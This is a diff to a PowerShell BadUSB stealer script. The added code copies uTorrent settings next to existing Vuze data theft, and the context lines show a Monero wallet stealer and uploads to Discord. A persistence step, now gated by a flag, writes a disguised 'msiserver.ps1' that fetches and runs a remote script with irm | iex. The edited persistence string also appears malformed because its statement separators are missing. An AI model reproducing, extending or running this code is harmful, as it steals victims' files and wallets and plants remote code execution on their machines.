@@ -55,6 +55,8 @@ New-Item -Path $env:tmp/$FolderName/Trees -ItemType Directory
 
 #$dc = ""
 
+#$pers = 'True'
+
 ############################################################################################################################################################
 
 # Send out started message!
@@ -104,13 +106,20 @@ if ($qbt -ne $null) {
 }
 
 # Vuze Data
-$qbt = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-if ($qbt -ne $null) {
+$vuze = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($vuze -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/Vuze" -ItemType Directory
 	Copy-Item "$env:appdata\Azureus\downloads.config" "$env:tmp/$FolderName/Vuze/downloads.config"
 	Copy-Item "$env:appdata\Azureus\dlhistoryd.config" "$env:tmp/$FolderName/Vuze/dlhistoryd.config"
 	Copy-Item "$env:appdata\Azureus\dlhistorya.config" "$env:tmp/$FolderName/Vuze/dlhistorya.config"
 	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/Vuze/azureus.config"
+}
+
+# uTorrent Data
+$utorrent = Get-Childitem -Path "$env:appdata\utorrent" -Include settings.dat -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($utorrent -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/uTorrent" -ItemType Directory
+	Copy-Item "$env:appdata\utorrent\settings.dat" "$env:tmp/$FolderName/uTorrent/settings.dat"
 }
 
 # Monero Wallet Stealer
@@ -1140,8 +1149,9 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
+if ($pers -eq 'True'){
 if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
-	$data = "`$dc='$dc';irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
+	$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
 	$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
 }
 if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
@@ -1153,7 +1163,7 @@ if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
 }
-
+}
 
 function Test-RegistryValue {
 
